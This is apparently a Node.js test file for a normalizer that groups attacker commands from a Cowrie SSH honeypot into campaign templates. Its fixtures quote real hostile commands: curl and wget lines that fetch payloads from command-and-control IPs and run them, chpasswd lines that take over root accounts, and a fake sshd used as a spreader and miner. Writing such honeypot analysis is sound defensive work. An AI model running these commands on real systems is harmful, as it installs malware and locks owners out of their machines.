const test = require('node:test');
const assert = require('node:assert');
const { normalizeCommand, looksRandom, TOKENS } = require('../lib/normalize');

/**
 * Fixtures are real commands from cowrie_unique_commands, not invented ones.
 *
 * The over-merge cases matter more than the collapse cases: a normalizer that
 * under-collapses leaves you with extra templates, which is visible and
 * annoying. One that over-collapses silently merges two actors into one row
 * and there is nothing left to notice it by.
 */

test('collapses randomised dropped-binary names', () => {
  assert.strictEqual(normalizeCommand('scp -t /tmp/V62vtXQH'), `scp -t /tmp/${TOKENS.RAND8}`);
  assert.strictEqual(
    normalizeCommand('cd /tmp && chmod +x V62vtXQH && bash -c ./V62vtXQH'),
    `cd /tmp && chmod +x ${TOKENS.RAND8} && bash -c ./${TOKENS.RAND8}`
  );
  // Two different drops of the same campaign must land on one template.
  assert.strictEqual(
    normalizeCommand('scp -t /tmp/V62vtXQH'),
    normalizeCommand('scp -t /tmp/Kp9zWmQ2')
  );
});

test('collapses the /dev/tcp loader temp filename and its C2 address', () => {
  const a = 'nohup $SHELL -c "curl http://120.77.178.159:9438/linux -o /tmp/NDJLWZSP90"';
  const b = 'nohup $SHELL -c "curl http://45.9.148.20:9438/linux -o /tmp/QRSTUVWX12"';
  // Same port, different host and filename: one campaign, one template.
  assert.strictEqual(normalizeCommand(a), normalizeCommand(b));
  assert.match(normalizeCommand(a), /<IP>/);
  assert.match(normalizeCommand(a), /<RAND10>/);

  // The C2 port is deliberately NOT tokenised. The 60107-60149 band is the
  // hunting signature for this family, so collapsing ports would erase the
  // thing Phase 4 exists to extract.
  const c = 'nohup $SHELL -c "curl http://45.9.148.20:60107/linux -o /tmp/QRSTUVWX12"';
  assert.notStrictEqual(normalizeCommand(b), normalizeCommand(c));
});

test('collapses the spreader hidden directory but keeps the structure', () => {
  const out = normalizeCommand('chmod +x ./.4293177954799656937/sshd;nohup ./.4293177954799656937/sshd 195.154.203.16 &');
  assert.strictEqual(out, `chmod +x ./.${TOKENS.RANDNUM}/sshd;nohup ./.${TOKENS.RANDNUM}/sshd ${TOKENS.IP} &`);
});

test('collapses byte counts in both forms', () => {
  assert.strictEqual(normalizeCommand('dd bs=1 count=1911588 > /tmp/QJBNafTBhy'),
    `dd bs=1 count=${TOKENS.SIZE} > /tmp/${TOKENS.RAND10}`);
  assert.strictEqual(normalizeCommand('head -c 3716336 > /tmp/x'), `head -c ${TOKENS.SIZE} > /tmp/x`);
  assert.strictEqual(normalizeCommand('head -c 1458464 > /tmp/x'), normalizeCommand('head -c 3716336 > /tmp/x'));
});

test('collapses a monero wallet', () => {
  const w = '46yvASpNp25BeTXJB9Zd18K' + 'a'.repeat(72);
  const out = normalizeCommand(`./sshd --user ${w} --pass x`);
  assert.ok(out.includes(TOKENS.XMR) || out.includes(TOKENS.B64),
    'a 95-char base58 wallet must not survive as a literal');
  assert.ok(!out.includes(w));
});

// ---------------------------------------------------------------------------
// Credential handling — the first field is the signal and must survive
// ---------------------------------------------------------------------------

test('preserves the first credential and tokenises the repeated new password', () => {
  assert.strictEqual(
    normalizeCommand('echo -e "support\\n6ePLHArr17wr\\n6ePLHArr17wr"|passwd|bash'),
    `echo -e "support\\n${TOKENS.RAND12}\\n${TOKENS.RAND12}"|passwd|bash`
  );
  assert.strictEqual(
    normalizeCommand('echo "123456\\nXGTpW4f7tPRK\\nXGTpW4f7tPRK\\n"|passwd'),
    `echo "123456\\n${TOKENS.RAND12}\\n${TOKENS.RAND12}\\n"|passwd`
  );
});

test('the 14 observed credentials stay 14 distinct templates', () => {
  // The whole point of preserving field one. If these collapse, the lockout
  // botnet's credential distribution is gone.
  const creds = ['123456', 'admin', 'admin123', 'a', 'user', 'ubuntu', 'password',
                 'qwerty', 'support', 'root', 'pi', 'raspberry', 'ubnt', 'orangepi'];
  const templates = new Set(
    creds.map((c) => normalizeCommand(`echo -e "${c}\\nAb3xKq9zLm2P\\nAb3xKq9zLm2P"|passwd|bash`))
  );
  assert.strictEqual(templates.size, creds.length);
});

test('the three passwd actors do not merge', () => {
  // Generated password (lockout botnet), hardcoded modzmodz (meow loader),
  // and a one-off. Distinct actors, so distinct templates.
  const generated = normalizeCommand('echo root:Ab3xKq9zLm2P | chpasswd');
  const modz      = normalizeCommand('echo root:modzmodz | chpasswd');
  const kitty     = normalizeCommand('echo root:kitty911 | chpasswd');
  assert.strictEqual(new Set([generated, modz, kitty]).size, 3);
  assert.match(generated, /<RAND12>/);
  assert.ok(modz.includes('modzmodz'), 'a hardcoded password is a fingerprint, not noise');
  assert.ok(kitty.includes('kitty911'));
});

test('$(whoami):modzmodz keeps both halves', () => {
  const out = normalizeCommand('echo $(whoami):modzmodz | chpasswd');
  assert.ok(out.includes('modzmodz') && out.includes('whoami'));
});

test('cat /etc/passwd is not dragged into the passwd family', () => {
  // The exclusion that /(passwd|chpasswd)/ as a family test gets wrong.
  for (const c of ['cat /etc/passwd', 'cat /etc/passwd | head -10', 'cat /etc/passwd | grep root']) {
    assert.strictEqual(normalizeCommand(c), c);
  }
});

// ---------------------------------------------------------------------------
// Over-merge guards
// ---------------------------------------------------------------------------

test('does not tokenise real 8-character program names', () => {
  // ./iptables and ./busybox are exactly the length the RAND8 rule looks for.
  for (const c of ['./iptables -L', 'chmod +x iptables', './slowhttp', 'cd /tmp && chmod +x systemd']) {
    assert.ok(!normalizeCommand(c).includes('<RAND'), `must not tokenise: ${c}`);
  }
});

test('does not tokenise weak human-chosen passwords', () => {
  for (const pw of ['123456', 'qwerty', 'password', 'raspberry', 'modzmodz', 'P@ssw0rd', 'ubnt']) {
    assert.strictEqual(looksRandom(pw), false, `${pw} should read as human-chosen`);
  }
  for (const pw of ['6ePLHArr17wr', 'XGTpW4f7tPRK', 'V62vtXQH', 'NDJLWZSP90']) {
    assert.strictEqual(looksRandom(pw), true, `${pw} should read as generated`);
  }
});

test('leaves ordinary recon commands completely untouched', () => {
  // The 490-odd commands with no randomised field must map 1:1, or the
  // template count is meaningless.
  const plain = ['uname -a', 'whoami', 'cat /proc/cpuinfo | grep name | wc -l', 'crontab -l',
                 'cd ~; chattr -ia .ssh; lockr -ia .ssh', 'top', 'w', 'free -m',
                 'uname -s -v -n -r -m', 'ls -lh $(which ls)', '[ -f /proc/version ]'];
  for (const c of plain) assert.strictEqual(normalizeCommand(c), c, `changed: ${c}`);
});

test('distinct campaigns stay distinct', () => {
  // Same shape, different C2 port range and binary: must not merge just
  // because both got their address tokenised.
  const a = normalizeCommand('wget http://1.2.3.4/meow; chmod 777 meow; ./meow');
  const b = normalizeCommand('wget http://1.2.3.4/bins.sh; chmod 777 bins.sh; ./bins.sh');
  assert.notStrictEqual(a, b);
});

test('is idempotent — normalising a template returns the template', () => {
  // The backfill and the ingest path may both touch a row; running twice
  // must not degrade it further.
  for (const c of ['scp -t /tmp/V62vtXQH', 'dd bs=1 count=1911588 > /tmp/QJBNafTBhy',
                   'echo -e "support\\n6ePLHArr17wr\\n6ePLHArr17wr"|passwd|bash']) {
    const once = normalizeCommand(c);
    assert.strictEqual(normalizeCommand(once), once, `not idempotent: ${c}`);
  }
});

test('handles the degenerate inputs without throwing', () => {
  for (const c of ['', null, undefined, 'sshd  &', '?']) {
    assert.doesNotThrow(() => normalizeCommand(c));
  }
});
